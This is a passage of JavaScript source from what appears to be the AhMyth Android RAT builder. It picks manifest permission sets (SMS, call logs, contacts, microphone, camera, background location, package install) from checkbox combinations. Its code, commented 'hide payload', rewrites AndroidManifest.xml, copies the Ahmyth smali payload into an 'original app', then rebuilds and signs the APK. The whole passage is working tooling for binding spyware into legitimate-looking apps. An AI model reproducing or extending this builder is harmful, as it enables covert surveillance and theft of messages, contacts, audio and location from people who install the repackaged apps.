            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
                //hide payload by editing AndroidManifest.xml
            fs.readFile(path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), 'utf8', (err,data) => {
                var defaultper = `    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.BACKGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>`
                var formatted2 = data.replace(defaultper, Permissionsrules);
            fs.writeFile(path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), formatted2, 'utf8', (err) => {
                if (err) {
                    $appCtrl.Log('Hiding in AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }
                })
        })
        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
            (error, stdout, stderr) => {
                if (error !== null) {
                    $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
                var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
                    (error, stdout, stderr) => {
                        if (error !== null) {
                            $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
                            return;
                        }


                        fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
                            if (err) throw err;

                            $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
                            $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
                            exec("cd app/app/Factory/Ahmyth/ && rm -rf AndroidManifest.xml && cd .. && cp Vault/AndroidManifest.xml.ahmyth Ahmyth/AndroidManifest.xml ")
                        });
                    });
            });

    }

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

        $appCtrl.Log("Copying Ahmyth files to orginal app...");
        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
            if (error) {
                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.GenerateApk(apkFolder);
        })

    };


    // function to copy all the ahmyth permissions to the orginal app
    $appCtrl.copyPermissions = (manifest) => {
        var firstPart = manifest.substring(0, manifest.indexOf("<application"));
        var lastPart = manifest.substring(manifest.indexOf("<application"));
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
